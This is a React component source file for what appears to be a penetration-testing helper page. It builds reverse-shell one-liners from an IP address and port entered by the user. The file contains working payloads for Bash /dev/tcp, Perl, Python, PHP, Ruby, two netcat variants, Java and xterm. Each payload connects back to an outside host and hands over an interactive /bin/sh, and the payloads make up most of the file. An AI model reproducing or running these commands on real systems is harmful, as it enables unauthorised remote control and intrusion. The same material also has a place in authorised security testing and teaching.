import React from 'react';
import CodeBlock from '../../components/codeblock/CodeBlock';
import Input from '../../components/input/Input';

const Shells = props => {

    const [ip, setIp] = React.useState(null);
    const [port, setPort] = React.useState(null);

    const handleIpChange = event => {
        setIp(event.target.value);
    }

    const handlePortChange = event => {
        setPort(event.target.value);
    }

    const ipHolder = ip || '<IP_ADDRESS>';
    const portHolder = port || '<PORT>';

    const bash = "bash -i >& /dev/tcp/" + ipHolder + "/" + portHolder + " 0>&1";
    const perl = "perl -e 'use Socket;$i=\"" + ipHolder + "\";$p=" + portHolder + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'";
    const python = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + ipHolder + "\"," + portHolder + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);";
    const php = "php -r '$sock=fsockopen(\"" + ipHolder + "\"," + portHolder + ");exec(\"/bin/sh -i <&3 >&3 2>&3\");'";
    const ruby = "ruby -rsocket -e'f=TCPSocket.open(\"" + ipHolder + "\"," + portHolder + ").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'";
    const netcat = "nc -e /bin/sh " + ipHolder + " " + portHolder;
    const netcat_alt = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + ipHolder + " " + portHolder + " >/tmp/f";
    const java = "r = Runtime.getRuntime() p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/" + ipHolder + "/" + portHolder + ";cat <&5 | while read line; do $line 2>&5 >&5; done\"] as String[])p.waitFor()";
    const xterm = "xterm -display " + ipHolder + ":" + portHolder;

    return (
        <React.Fragment>
            <Input keyword='IP Address' max="16" changed={handleIpChange} />
            <Input keyword='Port' max="6" changed={handlePortChange} />
            <br /><h2>Bash</h2>
            <CodeBlock code={bash} />
            <br /><h2>Perl</h2>
            <CodeBlock code={perl} />
            <br /><h2>Python</h2>
            <CodeBlock code={python} />
            <br /><h2>PHP</h2>
            <CodeBlock code={php} />
            <br /><h2>Ruby</h2>
            <CodeBlock code={ruby} />
            <br /><h2>Netcat</h2>
            <CodeBlock code={netcat} />
            <br /><h2>Netcat (Alternative way)</h2>
            <CodeBlock code={netcat_alt} />
            <br /><h2>Java</h2>
            <CodeBlock code={java} />
            <br /><h2>XTerm</h2>
            <CodeBlock code={xterm} />
        </React.Fragment>
    );
}

export default Shells;